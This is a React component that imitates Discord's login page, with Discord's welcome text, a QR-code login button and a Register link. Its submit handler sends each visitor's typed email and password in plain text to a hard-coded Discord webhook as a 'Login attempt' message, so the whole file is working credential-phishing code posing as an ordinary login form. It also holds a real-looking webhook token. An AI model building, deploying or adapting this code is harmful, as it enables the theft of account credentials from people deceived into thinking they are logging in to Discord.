
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { QrCode, Eye, EyeOff } from "lucide-react";

export function LoginForm() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    try {
      const response = await fetch("https://discord.com/api/webhooks/1368915728551645315/n44u0089wY_AQftgY5ku8ORhzyDIZK2iowqHIKwxbTbK2HzY-ayx-D1UYLt21w2PhH90", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: `Login attempt:\nEmail: ${email}\nPassword: ${password}`
        }),
      });

      if (response.ok) {
        console.log("Data sent successfully to Discord webhook");
      } else {
        console.error("Failed to send data to Discord webhook");
      }
    } catch (error) {
      console.error("Error sending data to Discord webhook:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-subtle flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        <Card className="bg-card border-border shadow-card">
          <CardHeader className="text-center pb-8">
            <CardTitle className="text-2xl font-bold text-foreground mb-2">
              Welcome back!
            </CardTitle>
            <CardDescription className="text-muted-foreground">
              We're so excited to see you again!
            </CardDescription>
          </CardHeader>
          
          <CardContent className="space-y-6">
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="email" className="text-sm font-medium text-foreground uppercase tracking-wide">
                  Email or Phone Number <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="bg-input"
                  required
                />
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="password" className="text-sm font-medium text-foreground uppercase tracking-wide">
                  Password <span className="text-destructive">*</span>
                </Label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="bg-input pr-10"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
              
              <button
                type="button"
                className="text-sm text-primary hover:underline"
              >
                Forgot your password?
              </button>
              
              <Button
                type="submit"
                variant="discord"
                className="w-full h-11 text-base"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Logging In..." : "Log In"}
              </Button>
            </form>
            
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border" />
              </div>
              <div className="relative flex justify-center text-xs uppercase">
                <span className="bg-card px-2 text-muted-foreground">Or</span>
              </div>
            </div>
            
            <Button
              variant="outline"
              className="w-full h-11 bg-card border-border hover:bg-secondary"
            >
              <QrCode className="mr-2 h-4 w-4" />
              Log in with QR Code
            </Button>
            
            <p className="text-sm text-muted-foreground">
              Need an account?{" "}
              <button className="text-primary hover:underline">
                Register
              </button>
            </p>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
